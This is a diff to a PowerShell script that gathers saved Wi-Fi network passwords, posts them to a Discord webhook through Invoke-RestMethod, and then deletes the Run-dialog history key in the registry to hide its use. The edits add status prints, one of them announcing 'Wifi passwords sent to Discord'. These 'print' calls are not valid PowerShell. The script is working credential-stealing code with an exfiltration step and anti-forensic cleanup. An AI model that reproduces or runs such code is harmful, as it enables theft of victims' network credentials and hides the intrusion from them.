@@ -25,6 +25,8 @@ $output = $wifiProfiles | ForEach-Object -Begin { $i = 0 } {
     $i++
 } | Format-Table -AutoSize | Out-String
 
+print($output)
+
 # Send the file to Discord
 
 $jsonBody = @{
@@ -39,10 +41,9 @@ $jsonBody = @{
     
 } | ConvertTo-Json
 
-
 Invoke-RestMethod -Uri $dc -Method Post -Body $jsonBody -ContentType "application/json" 
 
-# Delete run box history
+print("Wifi passwords sent to Discord")
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
